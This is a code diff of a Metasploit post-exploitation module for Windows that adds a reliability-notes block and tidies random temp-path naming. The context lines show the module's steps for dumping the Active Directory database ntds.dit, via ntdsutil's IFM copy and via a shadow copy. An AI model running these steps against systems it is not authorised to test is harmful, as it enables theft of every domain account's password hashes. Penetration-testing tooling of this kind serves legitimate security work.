@@ -28,6 +28,11 @@ class MetasploitModule < Msf::Post
         'Author' => ['theLightCosine'],
         'Platform' => [ 'win' ],
         'SessionTypes' => [ 'meterpreter' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -114,7 +119,7 @@ class MetasploitModule < Msf::Post
   end
 
   def ntdsutil_method
-    tmp_path = "#{get_env('%WINDIR%')}\\Temp\\#{Rex::Text.rand_text_alpha((rand(8) + 6))}"
+    tmp_path = "#{get_env('%WINDIR%')}\\Temp\\#{Rex::Text.rand_text_alpha(6..13)}"
     command_arguments = "\"activate instance ntds\" \"ifm\" \"Create Full #{tmp_path}\" quit quit"
     result = cmd_exec('ntdsutil.exe', command_arguments, 90)
     if result.include? 'IFM media created successfully'
@@ -195,7 +200,7 @@ class MetasploitModule < Msf::Post
     print_status "Getting Details of ShadowCopy #{id}"
     sc_details = get_sc_details(id)
     sc_path = "#{sc_details['DeviceObject']}\\#{location}\\ntds.dit"
-    target_path = "#{get_env('%WINDIR%')}\\Temp\\#{Rex::Text.rand_text_alpha((rand(8) + 6))}"
+    target_path = "#{get_env('%WINDIR%')}\\Temp\\#{Rex::Text.rand_text_alpha(6..13)}"
     print_status "Moving ntds.dit to #{target_path}"
     move_file(sc_path, target_path)
     target_path
